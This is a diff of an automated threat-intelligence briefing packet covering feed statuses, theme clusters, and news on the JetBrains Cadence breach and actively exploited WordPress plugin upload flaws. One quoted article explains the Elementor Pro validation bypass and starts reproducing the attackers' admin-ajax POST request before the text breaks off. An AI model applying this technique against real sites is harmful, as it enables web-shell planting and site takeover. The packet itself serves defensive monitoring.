@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-09-06T10:42:17.032000+00:00
+- Generated: 2026-09-06T14:04:21.984314+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
-- Feeds OK: 75
-- Total items in window: 423
+- Feeds OK: 74
+- Total items in window: 419
 - Total clusters raw: 201
-- Total clusters in packet: 79
-- Dropped low score: 122
+- Total clusters in packet: 78
+- Dropped low score: 123
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -85,16 +85,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 3
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
@@ -110,6 +110,11 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 3
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
@@ -130,6 +135,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 9
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - URL: https://horizon3.ai/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 7
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 3
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
@@ -140,41 +155,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 3
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
   - Item count: 100
   - In window count: 2
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - URL: https://horizon3.ai/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 7
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 3
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
-  - Status: ok
-  - Item count: 40
-  - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 23
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
@@ -185,31 +170,46 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
+  - Status: ok
+  - Item count: 40
+  - In window count: 0
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 23
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Black Hills Information Security** (detection_response_operations)
   - URL: https://www.blackhillsinfosec.com/feed/
   - Status: parse_error
   - Item count: 0
-  - In window count: 0
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
-  - Status: ok
-  - Item count: 15
   - In window count: 0
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **TrustedSec** (detection_response_operations)
-  - URL: https://www.trustedsec.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
+- **TrustedSec** (detection_response_operations)
+  - URL: https://www.trustedsec.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -220,21 +220,21 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 1
 - **SpecterOps** (detection_response_operations)
   - URL: https://medium.com/feed/specter-ops-posts
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 1
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Permiso Security** (cloud_identity_infrastructure)
   - URL: https://permiso.io/blog/rss.xml
   - Status: ok
@@ -245,11 +245,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 7
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
@@ -259,12 +254,12 @@
   - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
   - Item count: 100
-  - In window count: 3
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
+  - In window count: 2
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
-  - In window count: 0
+  - In window count: 1
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
@@ -275,16 +270,26 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 2
+  - Item count: 20
+  - In window count: 0
 - **Cloudflare Security** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 2
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
@@ -294,11 +299,6 @@
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
   - Item count: 0
-  - In window count: 0
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
-  - Status: ok
-  - Item count: 20
   - In window count: 0
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
@@ -320,16 +320,16 @@
   - Status: ok
   - Item count: 5
   - In window count: 5
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 15
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 17
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
@@ -340,31 +340,31 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **AI Snake Oil** (ai_security_agentic_risk)
-  - URL: https://www.aisnakeoil.com/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 19
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Elastic Security Labs** (detection_response_operations)
-  - URL: https://www.elastic.co/security-labs/rss/feed.xml
+- **AI Snake Oil** (ai_security_agentic_risk)
+  - URL: https://www.aisnakeoil.com/feed
   - Status: ok
-  - Item count: 100
-  - In window count: 1
+  - Item count: 20
+  - In window count: 0
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 24
+- **Elastic Security Labs** (detection_response_operations)
+  - URL: https://www.elastic.co/security-labs/rss/feed.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 19
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
@@ -375,16 +375,16 @@
   - Status: ok
   - Item count: 100
   - In window count: 100
-- **Schneier on Security** (practitioner_analysis)
-  - URL: https://www.schneier.com/feed/atom/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
   - Item count: 15
   - In window count: 1
+- **Schneier on Security** (practitioner_analysis)
+  - URL: https://www.schneier.com/feed/atom/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
@@ -395,11 +395,6 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
@@ -420,11 +415,21 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -435,11 +440,6 @@
   - Status: ok
   - Item count: 100
   - In window count: 18
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -478,22 +478,22 @@
 - Theme key: wordpress
 - Cluster count: 5
 - Article count: 6
-- Cohesion: 0.201
+- Cohesion: 0.221
 - Shared strong signals: WordPress
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: active_exploitation, zero_day
+  - threat_categories: active_exploitation
   - affected_industries: government
-  - affected_products: WordPress, OpenAI/ChatGPT
-  - urgency_signals: preauth_unauth, actively_exploited, zero_day, no_patch_yet
-- Cluster IDs: d5d207ddf7, 6a5c697136, 64d5865aac, fb5d93339a, d19603372e
+  - affected_products: WordPress
+  - urgency_signals: preauth_unauth, actively_exploited
+- Cluster IDs: d5d207ddf7, 6a5c697136, 64d5865aac, 9ebfca707c, d19603372e
 - Links:
   - https://www.exploit-db.com/exploits/52668
   - https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
   - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
-  - https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
   - https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
+  - https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
   - https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
 
 ### ShinyHunters targeting Salesforce
@@ -587,13 +587,13 @@
   - https://www.darkreading.com/vulnerabilities-threats/critical-langflow-flaw-exploited-attacks-rise
   - https://thehackernews.com/2026/09/attackers-exploit-critical-langflow-and.html
 
-### CVE-2026-85046 exploitation activity
-- Anchor signal: CVE-2026-85046
-- Theme key: cve-2026-85046
+### CVE-2026-3909 exploitation activity
+- Anchor signal: CVE-2026-3909
+- Theme key: cve-2026-3909
 - Cluster count: 2
 - Article count: 4
 - Cohesion: 0.533
-- Shared strong signals: CVE-2026-85046
+- Shared strong signals: CVE-2026-3909
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -625,13 +625,13 @@
   - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
   - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
 
-### CVE-2026-3909 exploitation activity
-- Anchor signal: CVE-2026-3909
-- Theme key: cve-2026-3909
+### CVE-2026-3910 exploitation activity
+- Anchor signal: CVE-2026-3910
+- Theme key: cve-2026-3910
 - Cluster count: 2
 - Article count: 4
 - Cohesion: 0.533
-- Shared strong signals: CVE-2026-3909
+- Shared strong signals: CVE-2026-3910
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -644,13 +644,13 @@
   - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
   - https://www.bleepingcomputer.com/news/security/google-warns-of-new-chrome-zero-day-flaw-exploited-in-attacks/
 
-### CVE-2026-3910 exploitation activity
-- Anchor signal: CVE-2026-3910
-- Theme key: cve-2026-3910
+### CVE-2026-85046 exploitation activity
+- Anchor signal: CVE-2026-85046
+- Theme key: cve-2026-85046
 - Cluster count: 2
 - Article count: 4
 - Cohesion: 0.533
-- Shared strong signals: CVE-2026-3910
+- Shared strong signals: CVE-2026-85046
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -774,7 +774,7 @@
 - **LockBit** (cluster 439827e1a6)
   - New industries: (none)
   - New products: GitHub
-  - Prior top industries: critical_infrastructure, financial_services, government
+  - Prior top industries: education, government, healthcare
   - Prior top products: GitLab, Gitea, OpenAI/ChatGPT
 - **UNC3886** (cluster c1f52c0381)
   - New industries: telecommunications
@@ -785,8 +785,8 @@
 ### Persistence (15)
 - actor_attribution: ShinyHunters (weeks observed: 13, cluster d8c893e316)
 - actor_attribution: Scattered Spider (weeks observed: 10, cluster fc5c9992d3)
-- actor_attribution: Cl0p (weeks observed: 8, cluster 498d32f5a8)
 - actor_attribution: LockBit (weeks observed: 8, cluster 439827e1a6)
+- actor_attribution: Cl0p (weeks observed: 7, cluster 498d32f5a8)
 - actor_attribution: APT29 (weeks observed: 6, cluster eae1569c42)
 - cve_ids: CVE-2025-3248 (weeks observed: 6, cluster 8370077906)
 - cve_ids: CVE-2026-55040 (weeks observed: 5, cluster 71ed2ba3b0)
@@ -1802,8 +1802,8 @@ Eli Woodward 3 min read July 8, 2025 ToolShell, SharePoint, and the Death of the
 - Published: 2026-09-05T16:52:33+00:00
 - Link: https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
 - Fetch status: ok
-- Member count: 6
-- Corroborating source count: 3
+- Member count: 5
+- Corroborating source count: 2
 - Strong signals: AWS
 
 #### Cluster taxonomy (union across members)
@@ -1835,18 +1835,13 @@ JetBrains is urging Cadence users to revoke and rotate all credentials following
 Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials  Ravie Lakshmanan  Sep 05, 2026 Data Breach / Identity Security JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said . "They should also treat all executions, including their inputs and outputs in your Cadence project, as potentially untrusted." "As the threat actors gained access to the Cadence server, any credentials or secrets stored in Cadence, contained in the compromised backup, or made available to executions on the affected server should be considered compromised and must be revoked or rotated." Cadence is a JetBrains-hosted cloud computing service that integrates with PyCharm via an optional plugin to let developers run machine learning and heavy workloads on cloud GPUs directly from their IDE. The attack, per the software development company, involved the exploitation of CVE-2026-63077 (CVSS score: 9.8) to breach the affected Cadence environments. The deserialization of untrusted data vulnerability can permit an unauthenticated attacker with access to a TeamCity server to bypass authentication checks and execute arbitrary operating system commands with the privileges of the TeamCity server process. The security flaw has since come under active exploitation in the wild, with the U.S. Cybersecurity and Infrastructure Security Agency (CISA) adding it to the Known Exploited Vulnerabilities (KEV) catalog on August 5, 2026. The exploitation was discovered by JetBrains on August 23, 2026. In subsequent updates, JetBrains said the threat actor accessed data contained in the Cadence server backup from 2024 and that they obtained unauthorized access that could have allowed them to reach storage containing data associated with current Cadence users, including email addresses, project source code, and credentials. "This affects the same group of users we previously contacted directly," Daniel Gallo, Solutions Engineering Lead at JetBrains, said. "These findings did not identify any additional affected users. As a precaution, we are treating the data stored there as potentially exposed." Some of the information the threat actor has been "confirmed" to have accessed or compromised - Personal data, including usernames, real names, email addresses, last-login timestamps, and last accessed IP addresses A full backup of the Cadence server dating from 2024, which contains credentials, configuration, artifacts, logs, or other data Multiple AWS IAM users and associated credentials/secrets used with Cadence extracted from the 20224 backup, including IAM users belonging to JetBrains employees who used the service Files stored in S3 buckets within JetBrains AWS accounts used by Cadence JetBrains also cautioned that the attackers may have accessed source code synchronized from PyCharm projects to the affected server. This covers scenarios where users have relied on PyCharm to upload or synchronize project files for execution in Cadence, meaning the actions could have inadvertently exposed code, credentials, or configurations. It's not clear who is behind the activity. However, JetBrains said the intrusion took place between August 8 and 24, 2026. The exploited Cadence server ("api.cadence.jetbrains.com") has since been taken offline. The company conceded that the server in question should have been patched as part of its own vulnerability response efforts, but did not share any details as to why this did not happen. JetBrains has also invalidated all access tokens used by the JetBrains Cadence plugin in PyCharm to connect to Cadence. It has shared the following indicators of compromise - Activity occurring from Augu
 ```
 
-#### Corroborating sources (3)
+#### Corroborating sources (2)
 
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials
   - Published: 2026-09-05T16:52:33+00:00
   - Link: https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
   - Summary: JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said.
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - Title: Bring Orca Security Context Into the AWS Console with the Orca Browser Extension
-  - Published: 2026-09-02T14:11:59+00:00
-  - Link: https://orca.security/resources/blog/orca-security-browser-extension-aws-console/
-  - Summary: Key Takeaways The Cost of Switching Tabs Cloud engineers and developers live in the AWS console, not in a security platform. So when a question comes up about a resource’s risk, the only path has been to stop, open a new tab, and go looking for that asset inside their security tooling. That detour costs […]
 - **AWS Security Blog** (cloud_identity_infrastructure)
   - Title: Incident response guide for AWS CloudTrail investigations – Part 2
   - Published: 2026-09-03T21:15:53+00:00
@@ -2131,60 +2126,6 @@ Summary In this episode of What’s in the SOSS, host Sally Cooper is joined by 
   - Published: 2026-09-01T13:16:32+00:00
   - Link: https://openssf.org/podcast/2026/09/01/whats-in-the-soss-podcast-71-s3e23-navigating-the-new-era-the-eu-cyber-resilience-act-explained-with-madalin-neag/
   - Summary: In this episode of What’s in the SOSS, host Sally Cooper and OpenSSF EU Policy Advisor Madalin Neag demystify the EU Cyber Resilience Act (CRA). Learn how the CRA establishes a new cybersecurity baseline and what it means for open source maintainers, contributors, and the global software supply chain.
-
-### Cluster fb5d93339a — score 11
-
-- Title: Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites
-- Source: SecurityWeek (cyber_news_breach_reporting)
-- Published: 2026-09-05T13:00:28+00:00
-- Link: https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
-- Fetch status: ok
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: CVE-2026-32475, WordPress
-
-#### Cluster taxonomy (union across members)
-- threat_categories: zero_day
-- affected_industries: critical_infrastructure
-- affected_products: OpenAI/ChatGPT, VMware, WordPress
-- cve_ids: CVE-2026-14894, CVE-2026-32475
-- urgency_signals: no_patch_yet, preauth_unauth, zero_day
-- content_type: news_report, vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day
-- affected_industries: critical_infrastructure
-- affected_products: WordPress, VMware, OpenAI/ChatGPT
-- cve_ids: CVE-2026-32475
-- urgency_signals: zero_day, preauth_unauth, no_patch_yet
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Tracked as CVE-2026-32475 (CVSS score of 9.8), the bug described as an arbitrary file upload issue in the function that handles form submissions. The post Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites appeared first on SecurityWeek .
-```
-
-#### Full body
-
-```
-Hackers have been exploiting a critical-severity vulnerability in the Elementor Pro WordPress plugin to hack websites, WordPress security firm Defiant warns. A highly popular drag-and-drop website builder, Elementor is a free WordPress plugin with over 10 million installations. Elementor Pro is the paid version that offers additional features, including a Form widget with support for File Upload fields. The bug, tracked as CVE-2026-32475 (CVSS score of 9.8), is described as an arbitrary file upload issue in the function that handles form submissions. While submissions are passed through the plugin’s validation and processing mechanisms, when the validation loop encounters an upload slot marked as empty, it triggers an error and returns, aborting the validation of other files in the field. The normal behavior would be to continue, skipping the empty entry, but the vulnerability results in checks never being applied to the remaining files uploaded through the same form field. An attacker can submit an upload field as an array with two parts: an empty slot that triggers the return, followed by a PHP payload that is uploaded without validation. Advertisement. Scroll to continue reading. Because the function that handles field processing correctly skips the empty slot and processes the second, unvalidated part of the field, the attacker-supplied file is written to disk. “As a result, an unauthenticated attacker can request the uploaded file to execute their PHP payload on the server,” Defiant explains , noting that this could lead to full site compromise. CVE-2026-32475 impacts all Elementor Pro plugin versions up to 4.2.1 and was patched in version 4.2.2 on August 19. Site owners should update to the fixed iteration as soon as possible. According to Defiant, threat actors started exploiting the security defect immediately after the fixes landed. The security firm has blocked over 190,000 exploit attempts to date. Successful exploitation of the vulnerability results in a PHP file being written to the /wp-content/uploads/elementor/forms/ directory, which stores uploaded form submissions. Site administrators are advised to check the directory for the presence of any PHP file, which is a strong indicator of compromise (IoC). They should also check logs for requests to /wp-admin/admin-ajax.php and check their sites for backdoors if any evidence of compromise is discovered. Defiant notes that Elementor Pro has over 6 million active installations, but it is unclear how many of them are affected. According to WordPress data , approximately two-thirds of Elementor’s 10 million installations run a vulnerable plugin version as of September 4. Related: 12-Year-Old PostgreSQL Vulnerability Enables Database, Server Takeover Related: VMware Workstation and Fusion Updates Patch Critical Vulnerability Related: Google Patches 6th Chrome Zero-Day of 2026 Related: Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Manchester Airports Group Data on 8.8 Million People Leaked After Ransom Refusal HiddenLayer Raises $100 Million for AI Runtime Security 153 Million Driver License Images Offered on Dark Web Over 3 Million WordPress Sites Affected by Migration Plugin Vulnerability Cisco Warns of Unpatched Secure Email Flaws, Patches Critical Switch Vulnerabilities Exploit Published for Fresh Cleo Harmony Vulnerability Malicious Virtualizor Update Served via BGP Hijacking Chrome and Firefox Updates Patch Dozens of Vulnerabilities Latest News In Other News: Microsoft’s Cloud Patches, Hacked Dropbox Accounts, Guardio’s $1.1B Valuation HPE Patches Critical RCE Vulnerabilities in AOS-CX OpenAI Pledges $1 Billion to Bring Frontier AI to Critical Infrastructure Defenders Sangoma Switchvox Vuln
-```
-
-#### Corroborating sources (2)
-
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites
-  - Published: 2026-09-05T13:00:28+00:00
-  - Link: https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
-  - Summary: Tracked as CVE-2026-32475 (CVSS score of 9.8), the bug described as an arbitrary file upload issue in the function that handles form submissions. The post Elementor Pro WordPress Plugin Vulnerability Exploited to Hack Sites appeared first on SecurityWeek .
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws
-  - Published: 2026-09-04T08:48:45+00:00
-  - Link: https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
-  - Summary: Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including
 
 ### Cluster 7bab174bc9 — score 11
 
@@ -2497,6 +2438,58 @@ Discover the alarming rise in compromised organizations since January. Learn how
   - Link: https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
   - Summary: Discover the alarming rise in compromised organizations since January. Learn how this impacts technology companies and what steps can be taken to mitigate the risks.
 
+### Cluster 9ebfca707c — score 11
+
+- Title: Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-09-04T08:48:45+00:00
+- Link: https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
+- Fetch status: ok
+- Member count: 2
+- Corroborating source count: 2
+- Strong signals: CVE-2026-14894, WordPress
+
+#### Cluster taxonomy (union across members)
+- threat_categories: web_shell_backdoor
+- affected_products: WordPress
+- cve_ids: CVE-2026-14894, CVE-2026-32475
+- urgency_signals: preauth_unauth
+- content_type: news_report, vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: web_shell_backdoor
+- affected_products: WordPress
+- cve_ids: CVE-2026-14894, CVE-2026-32475
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including
+```
+
+#### Full body
+
+```
+Over 440,000 Exploit Attempts Target Super Forms and Elementor Pro RCE Flaws  Ravie Lakshmanan  Sep 04, 2026 Vulnerability / Web Security Threat actors are exploiting two critical security flaws in WordPress plugins Super Forms and Elementor Pro, according to findings from Wordfence. The vulnerabilities in question are - CVE-2026-14894 (CVSS score: 9.8) - A missing file type validation vulnerability in Super Forms – Drag & Drop Form Builder that allows unauthenticated attackers to upload files of any type, including executable PHP files, leading to remote code execution. (Fixed in version 6.3.314) CVE-2026-32475 (CVSS score: 9.0/9.8) - A vulnerability in Elementor Pro that allows unauthenticated attackers to upload files of any type, including executable PHP files, leading to remote code execution. (Fixed in version 4.2.2) As with arbitrary file upload vulnerabilities of this kind, an attacker can leverage them to write a PHP web shell to the site and execute arbitrary code, which can then be abused to create administrator accounts, exfiltrate data, or seize control of the entire WordPress site. It's worth noting that details about CVE-2026-32475 were disclosed by Patchstack last month. Successful exploitation requires the target site to have at least one published Elementor page containing a Form widget with a File Upload field. In a pair of reports published this week, Wordfence said it has already blocked over 250,000 and 190,000 exploit attempts targeting CVE-2026-14894 and CVE-2026-32475, respectively. Exploitation Against CVE-2026-14894 In the attacks exploiting CVE-2026-14894, threat actors have been found to issue an HTTP POST request to "/wp-admin/admin-ajax.php" using the "super_submit_form" endpoint containing a file field with a Base64-encoded PHP payload and an attacker-controlled file name as below - action=super_submit_form&form_id=2&sf_nonce=04c3aa2046&data={"sf_upload_field": {"type": "files", "files": [{"datauristring": 